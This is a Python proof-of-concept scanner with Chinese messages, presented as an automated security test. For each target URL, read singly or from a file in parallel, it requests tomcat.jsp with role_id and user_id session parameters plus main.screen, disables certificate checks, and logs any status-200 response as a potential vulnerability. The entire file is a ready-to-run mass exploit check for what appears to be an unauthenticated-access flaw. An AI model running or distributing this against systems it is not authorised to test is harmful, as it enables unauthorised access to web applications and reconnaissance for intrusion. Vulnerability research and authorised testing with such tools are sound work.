import requests, argparse,sys,re
from concurrent.futures import ThreadPoolExecutor
requests.packages.urllib3.disable_warnings()


def banner():
    print("自动化安全测试脚本")


def validate_url(url):
    return re.match(r'^https?://', url) is not None


def poc(base_url):
    endpoints = [
        f"{base_url}/tomcat.jsp?dataName=role_id&dataValue=1",
        f"{base_url}/tomcat.jsp?dataName=user_id&dataValue=1",
        f"{base_url}/main.screen"
    ]
    with open('result.txt', 'a', encoding='utf-8') as f:
        for endpoint in endpoints:
            try:
                response = requests.get(url=endpoint, verify=False, timeout=10)
                status_code = response.status_code
                print(f"访问 {endpoint}，状态码: {status_code}")

                if status_code == 200:
                    content = response.text[:200]
                    headers = response.headers
                    print(f"内容：{content}")  # 打印前200字符
                    print(f"响应头：{headers}")

                    # 写入结果文件
                    f.write(f"{endpoint} 存在潜在漏洞，状态码: {status_code}\n")
                    f.write(f"内容：{content}\n")
                    f.write(f"响应头：{headers}\n\n")

            except requests.Timeout:
                print(f"请求超时: {endpoint}")
            except requests.HTTPError as e:
                print(f"HTTP 错误: {e}")
            except requests.RequestException as e:
                print(f"请求失败: {e}")


def process_url(url):
    if validate_url(url):
        poc(url)
    else:
        print(f"无效的 URL: {url}")


def main():
    banner()
    parser = argparse.ArgumentParser(description="自动化安全测试脚本")
    parser.add_argument('-u', '--url', dest='url', type=str, help='请提供基础 URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='请提供文件路径')
    args = parser.parse_args()

    if args.url and not args.file:
        process_url(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            url_list = [line.strip() for line in fp if line.strip()]

        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(process_url, url_list)
    else:
        print(f"\n\tUsage: python3 {sys.argv[0]} -h\n")


if __name__ == '__main__':
    main()

